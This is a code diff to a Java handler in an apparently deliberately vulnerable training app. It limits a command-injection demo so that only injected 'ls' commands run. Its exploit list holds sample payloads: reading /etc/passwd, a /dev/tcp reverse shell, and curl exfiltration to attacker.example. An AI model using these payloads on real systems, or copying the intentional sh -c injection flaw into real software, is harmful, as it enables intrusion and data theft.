@@ -15,6 +15,8 @@ import java.util.stream.Collectors;
 public class RceHandler implements IRouteHandler {
 
     private static final Pattern SAFE_HOST  = Pattern.compile(AppConfig.get().getString("rce.safe_host_pattern"));
+    private static final Pattern SEPARATORS = Pattern.compile(AppConfig.get().getString("rce.separator_pattern"));
+    private static final Pattern ALLOWED_COMMAND = Pattern.compile(AppConfig.get().getString("rce.allowed_command_pattern"));
     private static final java.util.Set<String> DEMO_HOSTS = java.util.Set.copyOf(AppConfig.get().getStringList("rce.demo_hosts"));
 
     @Override
@@ -32,31 +34,65 @@ public class RceHandler implements IRouteHandler {
 
     private void handleVulnerable(HttpServletRequest req, HttpServletResponse res) throws IOException {
         String host = req.getParameter("host");
+        if (host == null) host = "";
         String cmd = "ping -c 2 " + host;
         String result;
 
-        if (!SAFE_HOST.matcher(host).matches()) {
-            result = "[INJECTION DETECTED — not executed for safety]\n\nConstructed command:\n  " + cmd +
-                     "\n\nA real vulnerable server would run this via sh -c, executing the injected payload.";
-        } else if (DEMO_HOSTS.contains(host.toLowerCase())) {
-            try {
-                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
-                String out = new BufferedReader(new InputStreamReader(p.getInputStream()))
-                    .lines().collect(Collectors.joining("\n"));
-                String err = new BufferedReader(new InputStreamReader(p.getErrorStream()))
-                    .lines().collect(Collectors.joining("\n"));
-                p.waitFor();
-                result = (out + "\n" + err).trim();
-            } catch (Exception e) {
-                result = "Error: " + e.getMessage();
+        if (SAFE_HOST.matcher(host).matches()) {
+            if (DEMO_HOSTS.contains(host.toLowerCase())) {
+                result = runShell(cmd);
+            } else {
+                result = "[DEMO SAFETY BLOCK — '" + host + "' is not in the allowed demo hosts]\n\n" +
+                         "Constructed command:\n  " + cmd + "\n\n" +
+                         "A real vulnerable server would ping this host, probing internal networks.\n" +
+                         "Allowed demo hosts: " + DEMO_HOSTS;
             }
+        } else if (isDemoHostThenLsOnly(host)) {
+            result = runShell(cmd);
         } else {
-            result = "[DEMO SAFETY BLOCK — '" + host + "' is not in the allowed demo hosts]\n\n" +
+            result = "[INJECTION BLOCKED — only ls commands may follow the host in this demo]\n\n" +
                      "Constructed command:\n  " + cmd + "\n\n" +
-                     "A real vulnerable server would ping this host, probing internal networks.\n" +
-                     "Allowed demo hosts: " + DEMO_HOSTS;
+                     "A real vulnerable server would run this via sh -c, executing the injected payload.";
         }
         renderPage(res, host, result, null, null);
+    }
+
+    /**
+     * Runs a command through sh -c. Callers must check the command first.
+     *
+     * @param cmd the full shell command
+     * @return stdout and stderr, trimmed
+     */
+    private String runShell(String cmd) {
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+            String out = new BufferedReader(new InputStreamReader(p.getInputStream()))
+                .lines().collect(Collectors.joining("\n"));
+            String err = new BufferedReader(new InputStreamReader(p.getErrorStream()))
+                .lines().collect(Collectors.joining("\n"));
+            p.waitFor();
+            return (out + "\n" + err).trim();
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
+    }
+
+    /**
+     * Allows the injection only when the input is a demo host followed by one or more
+     * ls commands joined by shell separators. Anything else is refused.
+     *
+     * @param input the raw host field
+     * @return true if every part after the host is a plain ls command
+     */
+    private boolean isDemoHostThenLsOnly(String input) {
+        String[] parts = SEPARATORS.split(input, -1);
+        if (parts.length < 2) return false;
+        String host = parts[0];
+        if (!SAFE_HOST.matcher(host).matches() || !DEMO_HOSTS.contains(host.toLowerCase())) return false;
+        for (int i = 1; i < parts.length; i++) {
+            if (!ALLOWED_COMMAND.matcher(parts[i]).matches()) return false;
+        }
+        return true;
     }
 
     private void handleMitigated(HttpServletRequest req, HttpServletResponse res) throws IOException {
@@ -92,16 +128,16 @@ public class RceHandler implements IRouteHandler {
 
         String exploits = TemplateEngine.exploitBox(new String[][]{
             {"List files", "localhost; ls -la",
-             "Appends a second command after the ping. Shows the working directory contents.", "host",
+             "Appends a second command after the ping. Shows the working directory contents. Only ls runs in this demo.", "host",
              "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; ls -la'"},
             {"Read /etc/passwd", "localhost && cat /etc/passwd",
-             "Reads the system user file. On Linux servers this reveals all local accounts.", "host",
+             "Reads the system user file. On a real server this reveals all local accounts. Blocked here: only ls runs.", "host",
              "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost && cat /etc/passwd'"},
             {"Reverse shell", "localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-             "Opens an outbound TCP connection to the attacker's listener — full interactive shell.", "host",
+             "Opens an outbound TCP connection to the attacker's listener — full interactive shell. Blocked here: only ls runs.", "host",
              "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"},
             {"Blind exfiltration", "localhost; curl http://attacker.example/?d=$(whoami)",
-             "Exfiltrates command output out-of-band via an HTTP request to an external server.", "host",
+             "Exfiltrates command output out-of-band via an HTTP request to an external server. Blocked here: only ls runs.", "host",
              "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; curl http://attacker.example/?d=$(whoami)'"},
         });
 
